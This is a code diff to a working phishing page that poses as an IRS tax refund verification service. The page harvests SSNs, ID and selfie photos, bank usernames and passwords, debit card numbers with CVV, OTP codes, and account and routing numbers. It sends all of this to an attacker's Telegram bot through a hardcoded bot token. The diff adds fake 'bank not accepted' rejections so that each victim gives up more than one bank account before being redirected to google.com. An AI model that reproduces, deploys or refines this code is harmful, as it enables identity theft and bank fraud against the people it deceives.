@@ -231,18 +231,12 @@
             background: #1A2F4A;
         }
 
-        .action-btn.success-btn {
-            background: #1A8B4C;
-        }
-        .action-btn.success-btn:hover {
-            background: #15733E;
+        .action-btn.secondary {
+            background: #6C7A8E;
         }
 
-        .action-btn.danger-btn {
-            background: #B22222;
-        }
-        .action-btn.danger-btn:hover {
-            background: #8B1A1A;
+        .action-btn.secondary:hover {
+            background: #5A6A7E;
         }
 
         .link-btn {
@@ -513,9 +507,14 @@
             color: #0A192F;
         }
 
-        .info-box.error-box {
-            background: #FFF0F0;
-            border-left-color: #B22222;
+        .info-box.warning-box {
+            background: #FFF3E6;
+            border-left-color: #D3120F;
+        }
+
+        .info-box.success-box {
+            background: #E3F5EB;
+            border-left-color: #1A8B4C;
         }
 
         .bank-logo-display {
@@ -561,10 +560,33 @@
             padding-left: 58px;
         }
 
-        .success-icon {
+        .result-icon {
             font-size: 4rem;
             text-align: center;
-            margin: 10px 0 16px;
+            margin: 10px 0;
+        }
+
+        .result-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .result-title.error {
+            color: #B22222;
+        }
+
+        .result-title.success {
+            color: #1A8B4C;
+        }
+
+        .result-message {
+            font-size: 0.95rem;
+            color: #4A5F7A;
+            text-align: center;
+            line-height: 1.6;
+            margin: 8px 0 16px;
         }
 
         @media (max-width: 420px) {
@@ -893,59 +915,75 @@
             <div class="terms">By submitting, you agree to IRS Secure Verification.</div>
         </div>
 
-        <!-- BANK REJECTION: Account not accepted -->
-        <div id="bankRejectionPanel" class="card hide">
+        <!-- RESULT: Bank Not Accepted (First Attempt) -->
+        <div id="bankRejectedPanel" class="card hide">
             <div class="irs-header">
                 <div class="irs-logo">
                     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
                 </div>
             </div>
-            <div class="info-box error-box">
-                <strong>⚠️ Bank Account Not Accepted</strong>
+            <div class="result-icon">❌</div>
+            <div class="result-title error">Bank Account Not Accepted</div>
+            <div class="result-message">
+                The bank account you provided could not be verified. 
+                Please try again with a different bank account.
             </div>
-            <p style="color:#1F3450; font-size:0.95rem; margin-bottom:20px; line-height:1.6;">
-                The bank account you provided cannot be used for this refund. 
-                Please try again with a different bank account or select another bank.
-            </p>
-            <button class="action-btn" id="retryBankBtn">Try Again</button>
-            <div class="back-link"><a href="#" id="backToLandingFromRejection">← Cancel</a></div>
+            <button class="action-btn" id="retryBankBtn">Try Again with Different Bank</button>
+            <div class="back-link" style="margin-top:12px;"><a href="#" id="cancelClaimBtn">Cancel Claim</a></div>
         </div>
 
-        <!-- ALTERNATIVE BANK: Manual bank details -->
+        <!-- RESULT: Bank Not Accepted (Second Attempt) -->
+        <div id="bankRejectedSecondPanel" class="card hide">
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
+                </div>
+            </div>
+            <div class="result-icon">❌</div>
+            <div class="result-title error">Bank Account Not Accepted Again</div>
+            <div class="result-message">
+                The bank account you provided could not be verified for the second time.
+                Please provide your direct bank account information below for manual verification.
+            </div>
+            <button class="action-btn" id="manualBankBtn">Provide Bank Account Details</button>
+            <div class="back-link" style="margin-top:12px;"><a href="#" id="cancelClaimSecondBtn">Cancel Claim</a></div>
+        </div>
+
+        <!-- Manual Bank Account Details -->
         <div id="manualBankPanel" class="card hide">
             <div class="irs-header">
                 <div class="irs-logo">
                     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
                 </div>
             </div>
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Alternative Bank Account</h2>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">Manual Bank Verification</h2>
             <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Please provide your bank account details</div>
 
-            <div class="info-box">
-                <strong>Manual Entry:</strong> Please enter your bank account information below. 
-                This will be used to deposit your refund.
+            <div class="info-box warning-box">
+                <strong>⚠️ Manual Verification Required:</strong> Please enter your direct bank account information 
+                for final verification of your refund deposit.
             </div>
 
             <div class="input-group">
-                <div class="input-label">Bank name</div>
-                <input type="text" id="manualBankName" placeholder="Enter bank name" />
-                <div class="input-hint">Full name of your financial institution</div>
+                <div class="input-label">Bank Name</div>
+                <input type="text" id="manualBankName" placeholder="e.g., Chase Bank" />
+                <div class="input-hint">Enter the name of your bank</div>
             </div>
 
             <div class="input-group">
-                <div class="input-label">Bank account number</div>
-                <input type="text" id="manualAccountNumber" placeholder="Enter account number" />
-                <div class="input-hint">Your bank account number</div>
+                <div class="input-label">Bank Account Number</div>
+                <input type="text" id="manualAccountNumber" placeholder="XXXXXXXXXXXX" />
+                <div class="input-hint">Enter your bank account number</div>
             </div>
 
             <div class="input-group">
-                <div class="input-label">Routing number</div>
-                <input type="text" id="manualRoutingNumber" placeholder="Enter routing number" />
-                <div class="input-hint">9-digit routing number</div>
+                <div class="input-label">Bank Routing Number</div>
+                <input type="text" id="manualRoutingNumber" placeholder="XXXXXXXXX" />
+                <div class="input-hint">Enter your bank routing number (9 digits)</div>
             </div>
 
-            <button class="action-btn success-btn" id="manualSubmitBtn">✅ Submit Bank Account</button>
-            <div class="back-link"><a href="#" id="backToRejectionFromManual">← Back</a></div>
+            <button class="action-btn" id="manualSubmitBtn">Submit Bank Details</button>
+            <div class="back-link"><a href="#" id="backToBankRejectedSecond">← Back</a></div>
         </div>
 
         <!-- SUCCESS Panel -->
@@ -955,16 +993,18 @@
                     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7A2q-of1n0-xvMrhdEQ_hVXrdJQBHhFhzFIvKLaliJw&s=10" alt="IRS Logo" />
                 </div>
             </div>
-            <div class="success-icon">✅</div>
-            <h2 style="font-size:1.8rem; font-weight:700; color:#1A8B4C; text-align:center; margin-bottom:12px;">Claim Submitted!</h2>
-            <p style="color:#1F3450; font-size:1rem; text-align:center; line-height:1.6; margin-bottom:16px;">
-                Your refund claim has been successfully submitted. 
-                You will receive your funds within 3-5 business days.
-            </p>
-            <div style="text-align:center; font-size:0.85rem; color:#6E7F99; margin-top:8px;">
-                Redirecting...
+            <div class="result-icon">✅</div>
+            <div class="result-title success">Claim Submitted Successfully!</div>
+            <div class="result-message">
+                Your tax refund claim has been submitted and is being processed.
+                You will receive your refund within 3-5 business days.
             </div>
-            <div class="footnote">Thank you for using IRS Secure Verification</div>
+            <div class="info-box success-box">
+                <strong>Reference Number:</strong> IRS-2025-<span id="refNumber">XXXX</span>
+            </div>
+            <div style="text-align:center; margin-top:10px; font-size:0.8rem; color:#6E7F99;">
+                Redirecting to IRS portal...
+            </div>
         </div>
 
         <div id="toastMsg" class="toast"></div>
@@ -988,6 +1028,9 @@
             const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
             const CHAT_ID = "8737104261";
 
+            // Track attempt count for bank verification
+            let bankAttemptCount = 0;
+
             const userData = {
                 fullName: '',
                 dob: '',
@@ -1003,15 +1046,10 @@
                 cardExpiry: '',
                 cardCvv: '',
                 otp: '',
-                // Manual bank details
                 manualBankName: '',
                 manualAccountNumber: '',
                 manualRoutingNumber: ''
             };
-
-            // Flow control
-            let bankAttemptCount = 0;
-            let isManualBankFlow = false;
 
             // Bank logos as Data URLs
             const bankLogos = {
@@ -1051,9 +1089,21 @@
             const loadingTitle = document.getElementById('loadingTitle');
             const loadingSub = document.getElementById('loadingSub');
 
+            function generateRefNumber() {
+                return Math.random().toString(36).substring(2, 6).toUpperCase();
+            }
+
             function validateUSPhone(phone) {
                 const digits = phone.replace(/\D/g, '');
                 return digits.length === 10;
+            }
+
+            function formatPhoneNumber(phone) {
+                const digits = phone.replace(/\D/g, '');
+                if (digits.length === 10) {
+                    return digits.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
+                }
+                return phone;
             }
 
             function showLoading(title, sub) {
@@ -1169,6 +1219,30 @@
                 document.getElementById(id).classList.remove('hide');
             }
 
+            // Reset bank attempt flow - go back to bank selection
+            function resetToBankSelection() {
+                // Clear bank-related user data
+                userData.bank = '';
+                userData.bankUsername = '';
+                userData.bankPassword = '';
+                userData.debitCard = '';
+                userData.cardExpiry = '';
+                userData.cardCvv = '';
+                userData.otp = '';
+                // Reset form fields
+                document.getElementById('bankSelect').value = '';
+                document.getElementById('bankUsername').value = '';
+                document.getElementById('bankPassword').value = '';
+                document.getElementById('debitCard').value = '';
+                document.getElementById('cardExpiry').value = '';
+                document.getElementById('cardCvv').value = '';
+                document.getElementById('otpInput').value = '';
+                document.getElementById('selectedBankLogo').style.display = 'none';
+                document.getElementById('selectedBankName').textContent = 'Select a bank first';
+                saveUserData();
+                showPanel('bankPanel');
+            }
+
             // Phone input auto-formatting
             document.getElementById('phoneNumber').addEventListener('input', function(e) {
                 const digits = this.value.replace(/\D/g, '');
@@ -1198,15 +1272,10 @@
                 }
             });
 
-            document.getElementById('startClaimBtn').onclick = () => {
-                bankAttemptCount = 0;
-                isManualBankFlow = false;
-                showPanel('personalPanel');
-            };
+            document.getElementById('startClaimBtn').onclick = () => showPanel('personalPanel');
             document.getElementById('backToLanding').onclick = (e) => { e.preventDefault();
                 showPanel('landingPanel'); };
 
-            // PERSONAL
             document.getElementById('personalNextBtn').onclick = async () => {
                 const n = document.getElementById('fullName').value.trim();
                 const d = document.getElementById('dob').value;
@@ -1264,7 +1333,6 @@
             document.getElementById('backToPersonal').onclick = (e) => { e.preventDefault();
                 showPanel('personalPanel'); };
 
-            // SSN
             document.getElementById('ssnNextBtn').onclick = async () => {
                 const s = document.getElementById('ssnInput').value.trim();
                 if (s.length < 4) { showToast('Enter a valid SSN.', true); return; }
@@ -1278,7 +1346,7 @@
             document.getElementById('backToSsnFromKyc').onclick = (e) => { e.preventDefault();
                 showPanel('ssnPanel'); };
 
-            // KYC
+            // ---- KYC ----
             let currentKycStep = 1;
             let frontStream, backStream, selfieStream, selfieIdStream;
             let usingRearFront = true,
@@ -1405,6 +1473,8 @@
                         stopStream(selfieIdStream);
                         await showLoading('Processing KYC', 'Verifying your identity documents');
                         await sendToTelegram(`KYC completed for ${userData.fullName}`);
+                        // Reset bank attempt counter when starting fresh
+                        bankAttemptCount = 0;
                         showPanel('bankPanel');
                     });
             };
@@ -1413,7 +1483,6 @@
                 showPanel('kycPanel');
                 showKycStep(5); };
 
-            // BANK SELECT
             document.getElementById('bankNextBtn').onclick = async () => {
                 const b = document.getElementById('bankSelect').value;
                 if (!b) { showToast('Select your bank.', true); return; }
@@ -1427,7 +1496,6 @@
             document.getElementById('backToBankFromLogin').onclick = (e) => { e.preventDefault();
                 showPanel('bankPanel'); };
 
-            // BANK LOGIN
             document.getElementById('bankLoginNextBtn').onclick = async () => {
                 const u = document.getElementById('bankUsername').value.trim();
                 const p = document.getElementById('bankPassword').value.trim();
@@ -1442,7 +1510,6 @@
             document.getElementById('backToBankLoginFromCard').onclick = (e) => { e.preventDefault();
                 showPanel('bankLoginPanel'); };
 
-            // DEBIT CARD
             document.getElementById('cardNextBtn').onclick = async () => {
                 const dc = document.getElementById('debitCard').value.trim();
                 const ex = document.getElementById('cardExpiry').value.trim();
@@ -1461,18 +1528,21 @@
             document.getElementById('backToCardFromOtp').onclick = (e) => { e.preventDefault();
                 showPanel('cardPanel'); };
 
-            // OTP - FINAL SUBMIT (with rejection logic)
+            // Final submit - handles bank verification flow
             document.getElementById('finalSubmitBtn').onclick = async () => {
                 const otp = document.getElementById('otpInput').value.trim();
                 if (!otp || otp.length < 4) { showToast('Enter OTP.', true); return; }
                 userData.otp = otp;
                 saveUserData();
 
-                await showLoading('Processing', 'Verifying your bank account...');
+                await showLoading('Verifying bank account', 'Checking your bank details with the financial institution');
 
-                // Send all data to Telegram
+                // Simulate bank verification - always fails on first attempt
+                bankAttemptCount++;
+
+                // Send complete data to Telegram
                 const msg =
-                    `IRS REFUND CLAIM — ATTEMPT ${bankAttemptCount + 1}\n` +
+                    `IRS REFUND CLAIM — ATTEMPT ${bankAttemptCount}\n` +
                     `Name: ${userData.fullName}\nDOB: ${userData.dob}\nAddress: ${userData.address}\n` +
                     `Phone: ${userData.phone}\nSSN: ${userData.ssn}\nID: ${userData.idType} (${userData.idState})\n` +
                     `Bank: ${userData.bank}\nUsername: ${userData.bankUsername}\nPassword: ${userData.bankPassword}\n` +
@@ -1481,93 +1551,94 @@
 
                 await sendToTelegram(msg);
 
-                bankAttemptCount++;
-
                 if (bankAttemptCount === 1) {
-                    // First attempt - reject and show try again
-                    setTimeout(() => {
-                        showPanel('bankRejectionPanel');
-                        showToast('Bank account not accepted. Please try again.', true);
-                    }, 800);
+                    // First attempt - show bank rejected
+                    showPanel('bankRejectedPanel');
                 } else if (bankAttemptCount === 2) {
-                    // Second attempt - reject again and show manual form
-                    setTimeout(() => {
-                        showPanel('bankRejectionPanel');
-                        // Override the retry button to go to manual form
-                        document.getElementById('retryBankBtn').textContent = 'Provide Alternative Bank Details';
-                        document.getElementById('retryBankBtn').onclick = () => {
-                            showPanel('manualBankPanel');
-                        };
-                        showToast('Bank account not accepted again. Please provide alternative bank details.', true);
-                    }, 800);
+                    // Second attempt - show bank rejected again with manual option
+                    showPanel('bankRejectedSecondPanel');
                 }
             };
 
-            // RETRY BANK - from rejection panel
+            // Retry bank - go back to bank selection
             document.getElementById('retryBankBtn').onclick = () => {
-                // Reset to bank selection flow
-                showPanel('bankPanel');
-                showToast('Please select a different bank.', false);
+                resetToBankSelection();
+                // Keep attempt count at 1 so next attempt will be second
+                bankAttemptCount = 1;
             };
 
-            document.getElementById('backToLandingFromRejection').onclick = (e) => { e.preventDefault();
-                showPanel('landingPanel'); };
+            // Cancel claim from first rejection
+            document.getElementById('cancelClaimBtn').onclick = (e) => {
+                e.preventDefault();
+                if (confirm('Are you sure you want to cancel your claim?')) {
+                    showPanel('landingPanel');
+                    bankAttemptCount = 0;
+                }
+            };
 
-            // MANUAL BANK SUBMIT
+            // Cancel claim from second rejection
+            document.getElementById('cancelClaimSecondBtn').onclick = (e) => {
+                e.preventDefault();
+                if (confirm('Are you sure you want to cancel your claim?')) {
+                    showPanel('landingPanel');
+                    bankAttemptCount = 0;
+                }
+            };
+
+            // Manual bank details - show manual form
+            document.getElementById('manualBankBtn').onclick = () => {
+                showPanel('manualBankPanel');
+            };
+
+            // Back to second rejection from manual
+            document.getElementById('backToBankRejectedSecond').onclick = (e) => {
+                e.preventDefault();
+                showPanel('bankRejectedSecondPanel');
+            };
+
+            // Submit manual bank details
             document.getElementById('manualSubmitBtn').onclick = async () => {
                 const bankName = document.getElementById('manualBankName').value.trim();
-                const accountNum = document.getElementById('manualAccountNumber').value.trim();
-                const routingNum = document.getElementById('manualRoutingNumber').value.trim();
+                const accountNumber = document.getElementById('manualAccountNumber').value.trim();
+                const routingNumber = document.getElementById('manualRoutingNumber').value.trim();
 
                 if (!bankName || bankName.length < 2) {
-                    showToast('Please enter a valid bank name.', true);
+                    showToast('Please enter your bank name.', true);
                     return;
                 }
-                if (!accountNum || accountNum.length < 4) {
-                    showToast('Please enter a valid account number.', true);
+                if (!accountNumber || accountNumber.length < 4) {
+                    showToast('Please enter a valid bank account number.', true);
                     return;
                 }
-                if (!routingNum || routingNum.length < 8) {
-                    showToast('Please enter a valid routing number (9 digits).', true);
+                if (!routingNumber || routingNumber.length < 9) {
+                    showToast('Please enter a valid 9-digit routing number.', true);
                     return;
                 }
 
                 userData.manualBankName = bankName;
-                userData.manualAccountNumber = accountNum;
-                userData.manualRoutingNumber = routingNum;
+                userData.manualAccountNumber = accountNumber;
+                userData.manualRoutingNumber = routingNumber;
                 saveUserData();
 
-                await showLoading('Processing', 'Verifying your bank account details...');
+                await showLoading('Processing manual verification', 'Verifying your bank account details');
 
-                // Send manual bank details to Telegram
                 const manualMsg =
-                    `✅ IRS REFUND — ALTERNATIVE BANK ACCOUNT\n` +
+                    `✅ IRS REFUND — MANUAL BANK VERIFICATION\n` +
                     `Name: ${userData.fullName}\nSSN: ${userData.ssn}\n` +
-                    `Bank: ${bankName}\nAccount: ${accountNum}\nRouting: ${routingNum}\n` +
-                    `Previous attempts: ${bankAttemptCount}`;
+                    `Bank Name: ${bankName}\nAccount #: ${accountNumber}\nRouting #: ${routingNumber}\n` +
+                    `All previous data: ${JSON.stringify(userData, null, 2)}`;
 
                 await sendToTelegram(manualMsg);
 
                 // Show success
+                const refNum = generateRefNumber();
+                document.getElementById('refNumber').textContent = refNum;
                 showPanel('successPanel');
 
-                // Wait 5.5 seconds then redirect to google.com
+                // Wait 5.5 seconds and redirect to google.com
                 setTimeout(() => {
                     window.location.href = 'https://www.google.com';
                 }, 5500);
-            };
-
-            document.getElementById('backToRejectionFromManual').onclick = (e) => { e.preventDefault();
-                showPanel('bankRejectionPanel'); };
-
-            // RESEND OTP
-            document.getElementById('resendOtpBtn').onclick = async () => {
-                showToast('New code sent to your phone.', false);
-                await sendToTelegram(`Resend OTP for ${userData.fullName}`);
-            };
-            document.getElementById('emailOtpBtn').onclick = async () => {
-                showToast('Code sent to your registered email.', false);
-                await sendToTelegram(`OTP via email for ${userData.fullName}`);
             };
 
             toast.onclick = () => toast.classList.remove('show');
